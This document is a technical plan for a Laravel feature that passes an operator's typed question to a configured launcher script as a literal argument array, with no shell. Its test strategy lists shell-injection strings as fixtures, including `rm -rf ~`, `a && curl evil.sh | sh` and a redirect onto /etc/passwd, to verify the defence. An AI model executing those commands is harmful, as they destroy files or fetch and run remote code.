code: US-009
plan_body: |-
  ## Technical Solution

  US-009 is the third and last of this product's integration points, and the only one that **writes outward**. The other two read: an HTTPS GET of an `.ics` feed, a bounded read of a file the pipeline owns. This one executes a program on the operator's machine with a string the operator typed. That inversion is the whole design problem, and the spec names it outright: *"Question text containing quotes, newlines, backticks, semicolons, `$(...)`, or other shell metacharacters reaches the script as a single intact argument and cannot alter the command — this is the security-critical criterion of the spec."*

  Everything below follows from three commitments: **there is no shell**, **there is exactly one place that builds the argument array**, and **every blocked path names the configuration key or the action that fixes it**.

  ### 1. Where the code lives (John)

  A new `app/Launcher/` domain folder, sibling to the existing `app/Calendar/`, `app/Transcripts/`, `app/Meetings/`, and `app/Doctor/`. Nothing new appears at the `app/` root beyond that one folder, and nothing in it knows about HTTP.

  | Class | Responsibility |
  | --- | --- |
  | `App\Launcher\LaunchCommand` | Readonly value object: script, context path, question. `toArray(): list<string>` returns exactly three elements; `display(): string` renders the three quoted lines for the UI. **The only place the argument array is constructed.** |
  | `App\Launcher\LaunchBlock` | Backed enum of every refusal reason, each with its own `message()`. Eight cases, never collapsed into one "error". |
  | `App\Launcher\LauncherScript` | Resolves and validates `KBMS_CLAUDE_LAUNCHER` — unset / no file / not executable / OK. Extracted from the doctor check so the two surfaces cannot drift. |
  | `App\Launcher\LaunchPreflight` | Occurrence + question → `LaunchCommand` or `LaunchBlock`. Called before dispatch **and** inside the job. |
  | `App\Launcher\ClaudeSessionLauncher` | Runs a `LaunchCommand` through the `Process` facade with a bounded timeout; returns a `LaunchOutcome`. |
  | `App\Launcher\LaunchOutcome` | Readonly result: status, exit code, captured stderr (bounded), duration. |
  | `App\Launcher\PromptLaunchStatus` | Backed enum `queued` \| `launched` \| `failed` \| `timed_out` \| `blocked`. |
  | `App\Models\PromptLaunch` | The persisted row. |
  | `App\Jobs\LaunchClaudeSession` | Queued, `tries = 1`, takes the launch id. |
  | `App\Livewire\AskClaude` | The meeting-detail panel. |

  Service and job names are the ones the PRD `## Core Components` already commits to (`ClaudeSessionLauncher`, `LaunchClaudeSession`) — do not rename them.

  ### 2. One place builds the argument array, and the type system enforces it (Lars + Alex)

  `LaunchCommand::toArray()` returns `[$script, $contextPath, $question]` — exactly three elements, in that order, always. `ClaudeSessionLauncher::run(LaunchCommand $command): LaunchOutcome` takes the value object; there is **no overload that accepts a string**, so "someone interpolates a shell string one day" is prevented by the signature rather than by a code-review habit.

  Laravel's `Process` facade passes an **array** command straight to Symfony's `Process` constructor, which hands an argv array to `proc_open`. No shell is spawned, nothing is parsed, nothing is escaped — because there is nothing to escape. A question containing `` `rm -rf ~` `` arrives at the script as `$2`, byte for byte, and the script sees one argument. **Never** call `Process::run()` with a string anywhere in `app/Launcher/`, never prepend `sh -c`, `bash -lc`, `nohup`, or `open`, and never build a command by concatenation.

  `LaunchCommand::display()` is the opposite concern and must be labelled as such in its docblock: it renders the invocation for the operator to read and copy, as three lines — script, argument one, argument two — each wrapped in single quotes with embedded `'` escaped as `'\''`. That formatting **is** the argument-array statement made visible (mockup `meeting.html` L267-273). It is cosmetic output only and is never fed to a process. The panel and the job both derive from the same `LaunchCommand`, so what the operator copies is what the worker ran.

  ### 3. Eight refusals, each with its own sentence (Tom + Lars)

  `states.html` is explicit that these must not collapse, and the mockup README repeats it: *"Every error and blocked state names the configuration key or the action that fixes it."*

  | `LaunchBlock` case | Condition | Message (assert this string) |
  | --- | --- | --- |
  | `LauncherNotConfigured` | `KBMS_CLAUDE_LAUNCHER` empty | ``KBMS_CLAUDE_LAUNCHER`` is not configured. |
  | `LauncherMissing` | no file at the configured path | No launcher script at "{path}" — check `KBMS_CLAUDE_LAUNCHER`. |
  | `LauncherNotExecutable` | file exists, not executable | Script found but not executable: `chmod +x {path}` |
  | `NoTranscript` | no `meeting_transcripts` row, or the tombstone (`path` NULL) | No transcript linked — there would be no context file to pass as argument one. |
  | `TranscriptRejected` | persisted path fails `TranscriptsDirectory::contains()` | The linked path escapes `KBMS_TRANSCRIPTS_PATH` and is refused outright. |
  | `TranscriptUnreadable` | contained, but gone or unreadable now | The linked transcript is no longer readable at "{path}". |
  | `QuestionEmpty` | empty or whitespace-only after trim | Type a question first — whitespace only is rejected before anything is dispatched. |
  | `QuestionTooLong` | over `KBMS_QUESTION_MAX_CHARS`, or contains a null byte | Question is {n} characters; the bound is {max}. / A question cannot contain a null byte. |

  The first three are **exactly** what `App\Doctor\Checks\LauncherScriptCheck` already computes today. Extract that logic into `App\Launcher\LauncherScript` and have the doctor check consume it, keeping its existing `CheckResult` wording. `kbms:doctor` and the launch panel then answer the same question with the same code, which is the point of FR-011 in the first place. `DoctorCommandTest` must stay green unchanged — if it needs editing, the extraction changed behavior and is wrong.

  `NoTranscript` covers the tombstone deliberately: a `manual` row with `path = NULL` means the operator rejected the convention's match (US-007, decision `transcript clear link semantics`). There is no context file, so there is no launch.

  ### 4. The job waits for the exit code — superseding the inception decision (John + Jack)

  Recorded decision `terminal launch mode` originally read *"app fires it in background via `Process::start`"* (`2deaf85cb3b47934`). That is not implementable alongside two of this spec's acceptance criteria, and the user confirmed the supersession in this planning session (`d184baee682dd396`, 2026-09-10):

  - Symfony `Process::__destruct()` calls `stop(0)` (`vendor/symfony/process/Process.php:226`). A process started and not waited on is **killed** when the job object is collected. The spec's own reasoning for using a queued job says exactly this.
  - *"A non-zero exit from the launcher is recorded on the launch row and surfaced in the interface"* cannot be satisfied without waiting for an exit code.

  So the job calls `Process::timeout($seconds)->run($command->toArray())` and waits. This costs milliseconds in the normal case: the operator's script exists to spawn its own terminal window (`osascript`, `open -a`, or equivalent) and return, and that window belongs to the terminal application, not to PHP. Quitting `queue:work` does not close it — which is the acceptance criterion about lifetime independence, satisfied by the script's design rather than by any detachment trick on our side.

  `KBMS_LAUNCH_TIMEOUT_SECONDS` (default **30**) bounds the wait. A script that has not returned in 30 seconds is violating the documented two-argument contract — it is running Claude in the foreground instead of spawning a window — and the honest response is the one this product uses everywhere else: state it. `status = timed_out`, error text *"the launcher did not return within {n}s — it must exit once it has spawned its own terminal window"*, README updated to say so.

  Job configuration:

  - `public int $tries = 1;` — **not negotiable.** A retried job opens a second terminal window, and there is no key that could suppress the duplicate.
  - `public int $timeout` = `KBMS_LAUNCH_TIMEOUT_SECONDS + 15`, so the worker's own timeout never fires before the process timeout and steals the error message.
  - No `ShouldBeUnique`: two different meetings may legitimately launch at once. The double-click guard is §6's status transition.
  - No TTY (`Process` allocates none by default) and no PTY. The spec forbids driving a terminal, and we do not.

  ### 5. Preflight runs twice (Lars)

  Once in the Livewire action, so a blocked launch produces a specific reason and **nothing is dispatched**; once at the top of `handle()`, because the script, the transcript file, and `KBMS_TRANSCRIPTS_PATH` are all mutable between dispatch and execution. A second-pass failure writes `status = blocked` and the reason onto the row and returns — it never throws, because a failed precondition is not an exception, it is an outcome the operator needs to read.

  The context path is re-derived from the `meeting_transcripts` row and re-checked with `TranscriptsDirectory::contains()` on both passes. The stored path is an absolute string written when the base was what it was; the base is a `.env` value that can change under it. US-007 already made revalidate-on-every-read the rule here — this is the same rule applied to execution.

  Nothing client-supplied reaches the command except the question text. The script comes from config, the context path comes from the database via the occurrence key, and the occurrence key is `#[Locked]` on the component.

  ### 6. The row (Mike)

  `prompt_launches` — the shape the PRD `## Core Components` already specifies, plus `exit_code`:

  | Column | Type | Notes |
  | --- | --- | --- |
  | `id` | uuid pk | consistent with every other domain table |
  | `event_uid` | string | occurrence natural key |
  | `event_recurrence_id` | string, default `''` | |
  | `context_path` | string | absolute, as executed |
  | `question` | text | the operator's field — FR-012 reads this |
  | `command` | json | the argument array, as executed — the forensic record |
  | `status` | string | `PromptLaunchStatus` cast |
  | `exit_code` | integer, nullable | `127` in the mockup's worked example |
  | `error` | text, nullable | block reason, stderr excerpt, or timeout message |
  | `launched_at` | timestamp, nullable | set when the process actually starts |
  | timestamps | | `created_at` is the dispatch instant |

  Index `['event_uid', 'event_recurrence_id', 'created_at']` — serves the "latest launch for this occurrence" lookup now and FR-012's history list later, by leftmost prefix. **No foreign key to `calendar_events`**, for the reason already recorded twice in this codebase (decision `meeting note storage keying`): the only targetable column is the UUID surrogate `id`, which is precisely the identity a resync may change, and a cascade would hand the feed a route to destroy operator data. **No Eloquent relation** either — the composite-key `hasOne(...)->where(...)` workaround cross-contaminates siblings under `with()`. Reads go through `scopeForOccurrence(OccurrenceKey)`, exactly like `MeetingNote` and `MeetingTranscript`.

  Storing the question twice, in `question` and inside `command`, is deliberate: one is the operator's text, the other is what was actually executed. If they ever disagree, the bug is visible instead of silent.

  **Lifecycle, and the double-dispatch guard.** The Livewire action writes the row with `status = queued` and dispatches the job with its id. The job loads the row, and **refuses to run unless it is still `queued`** — so a second job for the same row (double click, manual re-dispatch, a retry that somehow slipped through) finds `launched` and returns without opening a second window. The button is also disabled client-side while a launch is `queued`, but that is convenience; the status check is the guard.

  Writing the row before dispatch also gives the panel something to show immediately — the mockup's `Dispatched` tag (`states.html` L347-349) — and gives the job a stable id rather than a serialized payload.

  **FR-012 is next phase.** This spec writes the rows and surfaces the **latest** launch's outcome only. Do not build the history list, even though `meeting.html` draws it; the mockup says outright that it is designed now *"so the `prompt_launches` row shape does not have to change later"*.

  ### 7. The panel (Elise + Joe)

  `App\Livewire\AskClaude`, replacing the `US-009` placeholder currently sitting in `resources/views/pages/meeting.blade.php`. Class-based, per the `.ai/rules/livewire.md` rule — `php artisan make:livewire AskClaude --class`.

  Built to `meeting.html` L243-273 and `states.html` L310-367:

  - Question `<textarea class="kb-textarea kb-textarea--sm">` with the help line *"Handed to your script as the second argument, exactly as typed — quotes, newlines and `$(...)` included, never interpreted."*
  - **The only `sk-btn--primary` on the page** — "▶ Launch session". Disabled with `aria-describedby` pointing at the block reason whenever preflight refuses.
  - A `Launcher ready` / `Blocked` tag in `.kb-panel__actions`.
  - The exact invocation in `<pre class="kb-command">`, three lines, `.kb-arg` and `.kb-arg--2` on the two arguments; a "Copy invocation" button reusing the existing pattern from `transcript-panel.blade.php` L108-114 (`onclick="navigator.clipboard.writeText(@js($display))"`), and the caption *"Two arguments, in order: context file, then question."*
  - Empty question: `aria-invalid="true"` on the textarea and `role="alert"` on the message, validated **before** anything is dispatched.
  - Latest outcome: `Dispatched` tag while queued; a `kb-banner role="alert"` carrying *"Launcher exited {code}"* plus *"Copy the invocation below and run it in a terminal to see the script's own output"* on failure.

  `.kb-command`, `.kb-command .kb-arg`, and `.kb-command .kb-arg--2` are the only classes this spec needs that `resources/css/app.css` does not already have — port them verbatim from `.larapilot/mockups/kbms-app/kbms.css` L324-331. `kb-textarea`, `kb-banner`, `kb-tag--muted`, `kb-inline`, `kb-stack`, `kb-path` are already there.

  **Polling.** While the latest launch is `queued`, `wire:poll.1s` on the panel; the poll stops the moment the status is terminal, so an idle meeting page issues no requests. If the row is still `queued` after `2 × KBMS_LAUNCH_TIMEOUT_SECONDS`, the panel adds *"still queued — is `php artisan queue:work` running?"*. The doctor check already warns that *"a reachable queue is not the same as a running worker"*; this is that warning delivered at the moment it matters.

  Desktop-first per the PRD's recorded inversion; the obligation is only that nothing breaks below 768px, which for this panel means the `<pre>` scrolls horizontally rather than wrapping the arguments. AA contrast in both themes for `.kb-arg` / `.kb-arg--2`, which reuse `--kb-transcript` and `--kb-note`.

  ### 8. The question bound (Tom + Alex)

  `KBMS_QUESTION_MAX_CHARS`, default **8000**. macOS `ARG_MAX` is 1 MiB shared across argv and the environment, so 8000 characters is two orders of magnitude clear of the kernel limit — the bound is a product decision, not a system one. That is exactly what makes the acceptance criterion *"a very long question is accepted or explicitly bounded — it must not fail opaquely against argument-length limits"* true by construction: the failure mode is a stated character count, never an `E2BIG` from `proc_open`.

  Enforced in the Livewire validation rules with a live counter near the textarea, and again in `LaunchPreflight` so a component-bypassing path cannot skip it. A null byte in the question is rejected on the same pass — `proc_open` cannot carry one in argv, and refusing it is clearer than truncating.

  ### 9. Configuration and documentation

  Two new keys, following the `config/kbms.php` array-shape PHPDoc convention and documented in all three places the existing surface is documented (`config/kbms.php`, `.env.example`, `ConfigurationSurfaceTest`, plus the README table):

  | Key | Default | Consumed by |
  | --- | --- | --- |
  | `KBMS_LAUNCH_TIMEOUT_SECONDS` | `30` | US-009 — seconds the job waits for the launcher to return |
  | `KBMS_QUESTION_MAX_CHARS` | `8000` | US-009 — maximum question length |

  The PRD `## Configuration surface` and `## PRD Revision History` gain a row for both, plus the `exit_code` column on `prompt_launches`. The README's existing **"The launcher script contract"** section grows three sentences: the script must return once it has spawned its window, its exit code is recorded and shown, and `php artisan queue:work` must be running for a launch to happen at all.

  ### 10. Explicitly not built

  Named here so review does not go looking for them: **no reply capture** (PRD non-goal, FR-018 — the meeting record holds the question, not the answer); **no prompt history list** (FR-012, next phase); **no prompt templates** (FR-015); **no TTY allocation and no terminal-application driving**; **no validation, linting, or editing of the operator's script** beyond exists-and-executable — the script is a configured dependency this product invokes and never touches.

  ## Git & Branching

  - Mode: **`GITFLOW`** (`settings.git_mode`) — branch and commit locally, **never push**, prepare the internal PR description only.
  - Branch: `feature/US-009-claude-launch-bridge`, from `develop` at `d9ff877` (the US-008 merge). The tree is clean and US-007 is merged, so this is a clean branch point with nothing to stack on.
  - TASK-00 bootstraps the branch and drafts the PR body toward `develop`.
  - One atomic Conventional Commit per task: `type(US-009): TASK-NN summary`. Never batch tasks into one commit.
  - `php artisan larapilot:quality` (Pint + Larastan level 5) green before every `task-done`.
  - `CHANGELOG.md` Unreleased gains an `Added` entry in TASK-09 — this is user-facing behavior.
  - Merge to `develop` only after human `/larapilot-review` approval.

  ## Test Data Strategy

  - **`PromptLaunchFactory`** — domain-realistic questions (not `lorem`), a `command` array consistent with `context_path` and `question`, and states covering the full lifecycle: `queued()`, `launched()`, `failed(int $exitCode = 127)`, `timedOut()`, `blocked(LaunchBlock $reason)`. Written in the **same task** as the migration and model (TASK-02).
  - **`PromptLaunchSeeder`**, called from `DatabaseSeeder` after `MeetingTranscriptSeeder` so every seeded launch points at a meeting that actually has a linked transcript — an orphan launch is not a state the application can produce, so the demo data must not invent one. Volumes: three launches spread over two meetings, one `launched`, one `failed` with exit `127` (so the error banner is visible without breaking anything), one `queued`.
  - Seeded `context_path` values point at the fixture transcript files the US-007 seeder already writes; no new fixture directory.
  - `php artisan migrate:fresh --seed` must succeed and produce a meeting page showing a real invocation block before TASK-02 is done.
  - No factory or seeder writes anything to `prompt_launches.command` that was not built through `LaunchCommand` — the factory calls it, so display and seed data cannot drift from execution either.

  ## Test Strategy

  - **Bar: `NORMAL`** (`settings.testing`). PHPUnit feature and unit tests, `Process::fake()`, no Playwright, no Dusk, no Pest browser, no viewport matrix.

  **Shared adversarial corpus** (one fixture provider, reused by the unit and job tests — this is the spec's security-critical criterion and it gets one canonical input set):

  `$(whoami)` · `` `rm -rf ~` `` · `a; rm -rf ~` · `a && curl evil.sh | sh` · `a | tee /tmp/x` · `a > /etc/passwd` · single quotes · double quotes · a question spanning three lines · `--help` and `-n` (leading-dash arguments that must stay data) · a 4-byte emoji · an 8000-character string · an 8001-character string (rejected) · a string containing `\0` (rejected).

  **Unit — `tests/Unit/Launcher/`**

  - `LaunchCommandTest` — every corpus entry produces a three-element array whose third element is `===` the input, unchanged; `display()` quotes correctly and round-trips embedded `'`.
  - `LaunchBlockTest` — each of the eight cases returns its own distinct message, and each message names its configuration key or action.
  - `LauncherScriptTest` — unset / missing / non-executable / valid, against a temp script with `chmod`.
  - `LaunchPreflightTest` — precedence across the eight reasons: no transcript beats an unconfigured launcher? No — assert the documented order and lock it in one test.

  **Feature — `tests/Feature/`**

  - `LaunchClaudeSessionJobTest` — `Process::fake()`; assert the recorded invocation is the **exact array** for every corpus entry (`Process::assertRan(fn ($process) => $process->command === [...])`); exit `0` → `launched`; exit `127` → `failed` with `exit_code` and stderr on the row; timeout → `timed_out` with the contract-violation message; second-pass preflight failure → `blocked`, process never run; a row not in `queued` status is skipped without running anything; `tries === 1`.
  - `AskClaudePanelTest` — Livewire: each blocked reason renders **its own string** (assert the string, not a status code, per the mockup's contract for Anne); whitespace-only question rejected with nothing dispatched (`Queue::fake()` + `assertNothingPushed`); 8001-character question rejected; a valid launch writes a `queued` row and pushes exactly one `LaunchClaudeSession`; the rendered invocation matches `LaunchCommand::display()`; a `failed` latest launch surfaces "Launcher exited 127".
  - `PromptLaunchDurabilityTest` — a resync that retitles, reschedules, and cancels the occurrence leaves its launches addressable by natural key (the same shape as `MeetingNoteDurabilityTest` / `TranscriptDurabilityTest`).
  - `ConfigurationSurfaceTest` — extended with both new keys in the documented-defaults assertions and the `.env.example` key list.
  - `DoctorCommandTest` — must pass **unchanged** after the `LauncherScript` extraction. Any edit needed there means the refactor changed behavior.
  - `MeetingDetailTest` — the US-009 placeholder string is gone and the panel renders.

  **Manual test handoff** (attached at review, since `NORMAL` plans no browser automation): with a real `chmod +x` script that runs `osascript` to open a Terminal window — launch, confirm the window opens with both arguments intact; quit `queue:work` and confirm the window survives; `chmod -x` the script and confirm the specific blocked message; point `KBMS_CLAUDE_LAUNCHER` at a script that `sleep 60`s and confirm the timeout message rather than a hung worker; paste a question containing `$(whoami)` and confirm the terminal shows it literally.
